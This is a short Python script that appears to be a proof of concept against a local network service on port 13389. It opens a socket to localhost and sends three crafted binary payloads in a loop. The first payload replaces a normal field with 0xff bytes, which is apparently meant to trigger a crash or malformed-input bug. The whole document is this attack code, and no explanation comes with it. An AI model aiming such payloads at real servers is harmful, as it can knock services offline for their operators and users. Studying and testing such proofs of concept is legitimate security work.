import socket
from threading import Thread
import binascii
import time
import os
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("127.0.0.1", 13389))


def deadlineThread():
	time.sleep(10)
	print("deadline 5 secs")
	os._exit(2)

def recvMsgThread():
	global s
	print("recving...")
	while True:
		p = s.recv(1024*4)
		print("recv", p)
		
		
		
thr1 = Thread(target=deadlineThread)
thr2 = Thread(target=recvMsgThread)


thr2.start()
thr1.start()

print("sending payload 1...")
while True:
	#raw = "02 02 00 00 0c 00 00 00  01 00 00 00 10 01 00 00 20 00 00 00 01 00 00 00 01 00 00 00 00 00 00 00 08 00 00 00 e9 44 17 2c a8 f6 13 fd".replace(" ", "")
	raw = "02 02 00 00 0c 00 00 00  01 00 00 00 10 01 00 00 20 00 00 00 01 00 00 00 01 00 00 00 00 00 00 00 08 00 00 00 ff ff ff ff ff ff ff ff".replace(" ", "")
	print(raw)
	payload = binascii.unhexlify(raw)
	s.send(payload)
	print("sent")

	print("sending payload 2...")
	raw = "02 01 00 00 10 00 00 00 53 31 35 30 07 02 00 02".replace(" ", "")
	print(raw)
	payload = binascii.unhexlify(raw)
	s.send(payload)
	print("sent")

	print("sending payload 3...")
	raw = "03 01 01 00 1e 00 00 00  65 86 a5 81 74 e0 e2 c6 6a 06 99 6a 54 fe 47 06  af 92 59 aa db 97".replace(" ", "")
	print(raw)
	payload = binascii.unhexlify(raw)
	s.send(payload)
	print("sent")


















